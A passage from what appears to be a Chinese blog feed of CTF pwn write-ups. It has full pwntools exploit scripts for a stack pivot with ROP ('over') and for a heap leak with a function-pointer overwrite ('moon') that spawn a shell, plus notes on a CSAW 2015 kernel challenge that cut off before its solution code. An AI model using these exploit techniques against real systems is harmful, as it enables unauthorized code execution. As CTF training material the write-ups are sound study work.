title="exp"></a>exp</h3><p>有点乱,将就看吧….ebp的地址设置动态调出来的,没算…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./over"</span>)</span><br><span class="line">p = process(<span class="string">"./over"</span>)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="comment">#staget 1 to leak ebppdb.set_trace()</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'A'</span>*<span class="number">79</span>)</span><br><span class="line">p.recv(<span class="number">80</span>)</span><br><span class="line">v_ebp =  u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leaked ebp :"</span>,hex(v_ebp)</span><br><span class="line"><span class="comment"># stage 2 to leak puts address</span></span><br><span class="line">p.recv()</span><br><span class="line">poprdi = p64(<span class="number">0x400793</span>)sh</span><br><span class="line">puts_gotplt = p64(<span class="number">0x601020</span>)</span><br><span class="line">puts_addr = p64(<span class="number">0x4006B9</span>)</span><br><span class="line">popret = p64(<span class="number">0x4006be</span>)</span><br><span class="line">payload2 = p64(v_ebp<span class="number">-0x50</span>)+poprdi+puts_gotplt + puts_addr+p64(v_ebp)+p64(<span class="number">0x400676</span>)+<span class="string">'A'</span>*<span class="number">32</span>+ p64(v_ebp<span class="number">-0x70</span>)+(popret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_libc_addr = u64(p.recv(<span class="number">6</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_libc_addr:"</span>,hex(puts_libc_addr)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment">#libc_2.23.so00007FB7B403900000007FB7B40A8690</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">libc_puts_system_offset = <span class="number">0x7F449904E690</span> - <span class="number">0x7F4499024390</span></span><br><span class="line">libc_binsh_puts_offset = <span class="number">0x7F6B855B3D57</span> - <span class="number">0x7F6B85496690</span></span><br><span class="line">libc_binsh_address = puts_libc_addr+libc_binsh_puts_offset</span><br><span class="line">libc_system_address = puts_libc_addr - libc_puts_system_offset </span><br><span class="line">payload3 = p64(v_ebp<span class="number">-0x50</span>)+poprdi+p64(libc_binsh_address) + p64(libc_system_address)+<span class="string">'A'</span>*<span class="number">48</span>+ p64(v_ebp<span class="number">-0x98</span>)+(popret)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># system7F4499024390</span></span><br><span class="line"><span class="comment"># puts7F449904E690</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#binsh 00007F6B855B3D57</span></span><br><span class="line"><span class="comment">#puts7F6B85496690</span></span><br></pre></td></tr></table></figure></p><h3 id="moon"><a href="#moon" class="headerlink" title="moon"></a>moon</h3><p>题目稍微多一点,但是利用起来也并不困难,查看代码:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">switch</span> ( get_choice() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      create();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      mydelete();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      edit();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      show();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      myexit();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"Sorry,Incorrect choice!\n"</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>认真分析一些代码,发现如下两个点:<br>show函数如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"which moon do you want to show:"</span>, <span class="number">0x1F</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"moon's id is worry\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write(<span class="number">1</span>, mo[v1], <span class="number">16u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>write(1, mo[v1], 16uLL);总是输出16位,这肯定有问题的.<br>再看edit函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"which moon do you want to edit:"</span>, <span class="number">0x1F</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> &amp;&amp; mo[v1] )</span><br><span class="line">    read_mbuf((__int64)mo[v1], <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"moon's id is worry\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>read_mbuf((__int64)mo[v1], 128);刚好溢出8个字节,覆盖free函数指针至system()即可,但是我们怎么得到system地址.<br>上面的show函数给我们提供了泄漏的机会,无论我们输入多少个字节,它都能输出16个字节.泄漏流程大致如下:</p><ol><li>申请一个moon</li><li>再申请一个moon</li><li>删除第一个moon,这个时候的话moon堆里面就变成了fd,bk都指向main_arena的malloc_state的top地址.</li><li>申请一个moon,占住删除的第一个moon,利用show进行泄漏即可.<br>原理一张图就能讲清楚.<br><img src="/img/arena.png" alt="arena.png"></li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./moon"</span>)</span><br><span class="line">p = process(<span class="string">"./moon"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createmoon</span><span class="params">(moon_name)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(moon_name)</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editmoon</span><span class="params">(id,moon_name)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">    p.send(moon_name)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletemoon</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showmoon</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line">    p.sendline(id)</span><br><span class="line">    tmp =  p.recv(<span class="number">8</span>)</span><br><span class="line">    addr = p.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">createmoon(<span class="string">"moon1"</span>)</span><br><span class="line">createmoon(<span class="string">"moon2"</span>)</span><br><span class="line">deletemoon(<span class="string">"0"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">createmoon(<span class="string">"moon3"</span>)</span><br><span class="line">ret_str = showmoon(<span class="string">"0"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">libc_malloc_state_top = u64(ret_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_malloc_state_top :"</span>,hex(libc_malloc_state_top)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_malloc_state_top off_7FABDEE46B78   libc_2.23.so00007FABDEA8200000007FABDEC42000R.XD.byte0000publicCODE6400000000000000000000</span></span><br><span class="line">malloc_state_libc_offset = <span class="number">0x7FABDEE46B78</span> - <span class="number">0x7FABDEA82000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system7EFD38522390 libc_2.23.so00007EFD384DD00000007EFD3869D000R.XD.byte0000publicCODE6400000000000000000000</span></span><br><span class="line">system_libc_offset = <span class="number">0x7EFD38522390</span><span class="number">-0x7EFD384DD000</span></span><br><span class="line">libc_system_addr = libc_malloc_state_top - malloc_state_libc_offset + system_libc_offset</span><br><span class="line">createmoon(<span class="string">"moon4"</span>)</span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>+<span class="string">'A'</span>*<span class="number">112</span>+p64(libc_system_addr)</span><br><span class="line">editmoon(<span class="string">"0"</span>,payload)</span><br><span class="line">deletemoon(<span class="string">"0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://pan.baidu.com/s/16gD9t5SVkkIkMahElDaSMw" target="_blank" rel="noopener">https://pan.baidu.com/s/16gD9t5SVkkIkMahElDaSMw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;感觉平台对我这种刚入门安全的人来说还是比较友好的,上次的月赛没有时间打,这周末看了一下竟然还有周周练,都是pwn题,所以拿来练练手,让自己多
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Linux-csaw2015</title>
    <link href="https://foyjog.github.io/2018/07/05/Linux-Kernel-Exploitation-on-Linux-csaw2015/"/>
    <id>https://foyjog.github.io/2018/07/05/Linux-Kernel-Exploitation-on-Linux-csaw2015/</id>
    <published>2018-07-05T09:01:10.000Z</published>
    <updated>2018-07-05T09:52:21.869Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>额,还是看代码,先看懂再说.认真分析一遍,一个关于读取,扩大缩小ipc的程序.再看一下漏洞点,其实这是一个整数溢出的漏洞,通过将-1设置为new size,就可以达到64位内核所有地址的读写操作.</p><p>这里只记录一下这道题目的一些知识点.</p><h3 id="关于cred和real-cred"><a href="#关于cred和real-cred" class="headerlink" title="关于cred和real_cred"></a>关于cred和real_cred</h3><p>这两个结构体都在task_struct中.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>  <span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">                                     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">                                       it with task_lock())</span></span><br><span class="line"><span class="comment">                                     - initialized normally by setup_new_exec */</span></span><br><span class="line">......</span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>  <span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">                                     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">                                       it with task_lock())</span></span><br><span class="line"><span class="comment">                                     - initialized normally by setup_new_exec */</span></span><br></pre></td></tr></table></figure></p><p>这两个结构体一般都是指向一个地址的.但是有一些区别,read_cred指的是该进程能访问该进程所需的特权信息的结构，而cred指的是包含进程在尝试执行其他操作时将具有的权限信息的结构。即一个是对自己的权限,一个是操作其他的权限.<br>他们的结构体如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">        <span class="keyword">atomic_t</span>        usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">        <span class="keyword">atomic_t</span>        subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">        <span class="keyword">void</span>            *put_addr;</span><br><span class="line">        <span class="keyword">unsigned</span>        magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC      0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">kuid_t</span>          uid;            <span class="comment">/* real UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          gid;            <span class="comment">/* real GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          suid;           <span class="comment">/* saved UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          sgid;           <span class="comment">/* saved GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          euid;           <span class="comment">/* effective UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          egid;           <span class="comment">/* effective GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          fsuid;          <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          fsgid;          <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">        <span class="keyword">unsigned</span>        securebits;     <span class="comment">/* SUID-less security management */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_bset;       <span class="comment">/* capability bounding set */</span></span><br><span class="line">        <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure></p><p>很明显能看出来修改uid,gid这几个字段是我们的目的所在了.</p><p>writeup中是通过设置 char comm[TASK_COMM_LEN]; 来作为标记,然后进行内存的搜索,只要搜索到了,就能确实uid和gid的位置.</p><h3 id="64内核的结构和32位内核的结构"><a href="#64内核的结构和32位内核的结构" class="headerlink" title="64内核的结构和32位内核的结构"></a>64内核的结构和32位内核的结构</h3><p>通常32位Linux内核地址空间划分0~3G为用户空间，3~4G为内核空间。<br><img src="/img/32linux.png" alt="我是图片"></p><p>64位地址时将0x0000,0000,0000,0000 – 0x0000,7fff,ffff,f000这128T地址用于用户空间。<br>而0xffff,8000,0000,0000以上为系统空间地址。<br><img src="/img/64linux.png" alt="我是图片"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这两个星期在做fuzz的时候吧csaw的题目刷了一下,后面的两个题目因为时间,我没有选择去编译内核调试,只是理解了一下,其实在调试的时候会发现更多的问题吧,csaw这些内核题让我对内核有一些初步的了解,但是还远远不够,接下来我想要开始调试一些真正的cve了,希望通过调试一些cve,能够迈进漏洞挖掘的大门吧,慢慢来,不急于一时.</p><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span 